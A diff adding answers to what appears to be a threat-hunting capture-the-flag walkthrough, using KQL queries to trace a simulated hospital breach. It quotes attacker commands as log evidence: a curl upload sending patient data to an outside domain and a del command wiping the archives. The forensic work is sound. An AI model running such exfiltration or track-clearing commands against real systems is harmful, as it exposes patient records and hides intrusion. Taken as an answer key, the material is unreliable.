@@ -142,3 +142,102 @@ C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Do
 
 **Answer: spread_ransomware.exe**<br><br>
 
+**Q17. What information did the attackers put into patient_data_1.zip? Provide the full path of the network share \\something\like\this**<br><br>
+
+```
+ProcessEvents
+| where hostname == "AMFB-MACHINE"
+| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
+| where process_commandline contains "patient_data_1.zip"
+```
+<br>
+
+Under the process commandline column, the directory to where the files were dropped can be found.<br><br>
+
+```
+C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_1.zip /source \\jojos-hospital-server\important_data\patient_records
+```
+<br>
+
+**Answer: \\jojos-hospital-server\important_data\patient_records**<br><br>
+
+**Q18. What information did the attackers put into patient_data_2.zip? Provide the full path of the network share \\something\like\this**<br><br>
+
+```
+ProcessEvents
+| where hostname == "AMFB-MACHINE"
+| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
+| where process_commandline contains "patient_data_2.zip"
+```
+<br>
+
+Under the process commandline column, the directory to where the files were dropped can be found.<br><br>
+
+```
+C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_2.zip /source \\jojos-hospital-server\important_data\archive\patient-records
+```
+<br>
+
+**Answer: \\jojos-hospital-server\important_data\archive\patient-records**<br><br>
+
+**Q19. What information did the attackers put into patient_data_3.zip? Provide the full path of the network share \\something\like\this**<br><br>
+
+```
+ProcessEvents
+| where hostname == "AMFB-MACHINE"
+| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
+| where process_commandline contains "patient_data_3.zip"
+```
+<br>
+
+Under the process commandline column, the directory to where the files were dropped can be found.<br><br>
+
+```
+C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_3.zip /source \\jojos-hospital-server\important_data\old-patient-data
+```
+<br>
+
+**Answer: \\jojos-hospital-server\important_data\old-patient-data**<br><br>
+
+**Q20. What domain (e.g. abcd.com) did the attackers send the stolen data to?**<br><br>
+Searching for the term curl in the process command line to look for commands entered to exfiltrate the data
+.<br><br>
+
+```
+ProcessEvents
+| where hostname == "AMFB-MACHINE"
+| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
+| where process_commandline contains "curl"
+```
+<br>
+
+Taking the first result, the domain can be found.<br><br>
+
+```
+cmd.exe /c curl -T C:\Users\andavis\Documents\patient_data_1.zip https://secure-health-access.com/upload/patient_data_1.zip
+```
+<br>
+
+**Answer: secure-health-access.com**<br><br>
+
+**Q21. What command did they use to clear their tracks? Copy and paste the full command.**<br><br>
+Narrow down the search to look for commands use to delete their tracks.<br><br>
+
+```
+ProcessEvents
+| where hostname == "AMFB-MACHINE"
+| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
+| where parent_process_name == "cmd.exe"
+| where process_commandline contains "patient"
+```
+<br>
+
+The last result in the process command line.<br><br>
+
+```
+cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip
+```
+<br>
+
+**Answer: cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip**<br><br>
+
